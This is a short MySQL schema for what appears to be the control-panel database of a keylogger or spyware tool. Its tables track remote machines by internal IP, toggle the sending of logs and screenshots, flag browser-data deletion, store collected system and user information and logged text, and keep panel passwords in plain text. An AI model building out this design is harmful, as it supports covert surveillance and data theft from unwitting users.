create table vodka_controller (

    id int not null auto_increment primary key ,
    username varchar(100000) not null ,
    internal_ip_address varchar(200) not null ,
    vodka_key varchar(100) not null ,
    continue_sending_logs varchar(100) not null , 
    continue_sending_screenshots varchar(100) not null , 
    user_information varchar(20000) not null ,
    system_information varchar(20000) not null ,
    computer_information varchar(20000) not null ,
    delete_browser_data varchar(100) not null ,
    last_log_sent VARCHAR (2000) not null

);

create table vodka_users (

    id int not null AUTO_INCREMENT primary key,
    username varchar(100) not null ,
    password varchar (100) not null ,
    vodka_key varchar(100)  not null
    );



create table vodka_logs (
id int AUTO_INCREMENT PRIMARY KEY NOT NULL ,
belongs_to varchar(20000) not null,
    date_sent varchar (2000) not null,
    internal_ip_address varchar(2000) not null ,
    text varchar(6535)





);